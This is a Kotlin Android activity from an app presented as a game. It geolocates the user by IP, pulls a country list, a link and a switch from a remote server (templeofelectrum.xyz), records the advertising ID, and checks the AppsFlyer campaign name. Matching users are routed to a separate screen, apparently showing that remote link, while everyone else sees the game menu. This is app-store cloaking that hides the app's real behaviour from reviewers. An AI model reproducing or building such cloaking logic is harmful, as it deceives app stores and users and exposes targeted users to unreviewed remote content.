package com.skgames.t

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.orhanobut.hawk.Hawk
import com.skgames.t.MClass.Companion.C1
import com.skgames.t.MClass.Companion.MAIN_ID
import com.skgames.t.MClass.Companion.appsCheck
import com.skgames.t.MClass.Companion.link
import com.skgames.t.databinding.ActivityMainBinding
import com.skgames.t.logic.MenuActivity
import kotlinx.coroutines.*
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    lateinit var bindMainAct: ActivityMainBinding

    @OptIn(DelicateCoroutinesApi::class)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        bindMainAct = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMainAct.root)

        GlobalScope.launch(Dispatchers.IO) {
            job
        }

        AppsFlyerLib.getInstance().init("vnUR4EzwcRJaLdePNv9URJ",conversionDataListener,applicationContext)
        AppsFlyerLib.getInstance().start(this)
    }

    private fun getAdId(){
            val adInfo = AdvertisingIdClient(applicationContext)
            adInfo.start()

            val adIdInfo = adInfo.info.id
            Hawk.put(MAIN_ID, adIdInfo)
    }

    //Data API
    private suspend fun getData(): String? {
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ApiInterface::class.java)
        val retData = retrofitBuilder.getData().body()?.countryCode

        return retData
    }

    private suspend fun getDataDev(): String? {
        val retroBuildTwo = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://templeofelectrum.xyz/")
            .build()
            .create(ApiInterface::class.java)

        val linkView = retroBuildTwo.getDataDev().body()?.view
        val appsChecker = retroBuildTwo.getDataDev().body()?.appsChecker

        Hawk.put(appsCheck, appsChecker)
        Hawk.put(link, linkView)

        val retroData = retroBuildTwo.getDataDev().body()?.geo
        return retroData
    }

    @OptIn(DelicateCoroutinesApi::class)
    private val job: Job = GlobalScope.launch(Dispatchers.IO) {
        val countyCode: String = getData().toString()
        val countriesPool = getDataDev().toString()

        val appsCh: String? = Hawk.get(appsCheck)
        var naming: String? = Hawk.get(C1)

        getAdId()
        if (appsCh == "1") {
            val executorService = Executors.newSingleThreadScheduledExecutor()
            executorService.scheduleAtFixedRate({
                if (naming != null) {
                    if (naming!!.contains("tdb2") || countriesPool.contains(countyCode)) {
                        executorService.shutdown()
                        startActivity(Intent(this@MainActivity, LogActivity::class.java))
                        finish()
                    } else {
                        executorService.shutdown()
                        startActivity(Intent(this@MainActivity, MenuActivity::class.java))
                        finish()
                    }
                } else {
                    naming =  Hawk.get(C1)
                }
            }, 0, 2, TimeUnit.SECONDS)
        } else if (countriesPool.contains(countyCode)) {
            startActivity(Intent(this@MainActivity, LogActivity::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, MenuActivity::class.java))
            finish()
        }
    }

    private val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            Hawk.put(C1, dataGotten)
        }
        override fun onConversionDataFail(p0: String?) {}
        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

}







